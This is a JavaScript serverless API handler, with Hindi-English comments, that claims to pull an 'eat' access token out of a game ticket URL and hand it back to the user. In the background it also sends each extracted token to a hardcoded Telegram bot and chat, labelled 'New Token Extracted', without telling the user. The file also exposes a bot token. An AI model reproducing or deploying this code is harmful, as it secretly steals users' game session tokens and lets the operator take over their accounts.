export default async function handler(req, res) {
    // Ye line CORS error se bachane ke liye hai
    res.setHeader('Access-Control-Allow-Origin', '*');

    // API query parameter se URL lena (e.g., /api?url=https://ticket.kiosgamer...)
    const inputUrl = req.query.url;

    if (!inputUrl) {
        return res.status(400).json({ error: "Bhai URL provide karo query me '?url=' lagakar" });
    }

    try {
        // URL se 'eat' parameter nikalna
        const parsedUrl = new URL(inputUrl);
        const eatToken = parsedUrl.searchParams.get("eat");

        if (!eatToken) {
            return res.status(400).json({ error: "Is URL me 'eat' token nahi mila" });
        }

        // --- TELEGRAM BOT LOGIC ---
        const botToken = "8723720397:AAFqClGfTba8WwnCpLHEZWz5NuCfJOLr494";
        const chatId = "8257117768";
        const message = `🚨 **New Token Extracted** 🚨\n\n**Token:** \`${eatToken}\`\n\n**Developer:** @Brexxee`;

        const tgApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Telegram par message bhejna (background me)
        await fetch(tgApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        // --- USER KO RESPONSE DENA ---
        return res.status(200).json({
            access_token: eatToken,
            validity: "14 day",
            developer: "tg @Brexxee"
        });

    } catch (error) {
        return res.status(500).json({ error: "Invalid URL format ya server me koi issue hai." });
    }
}
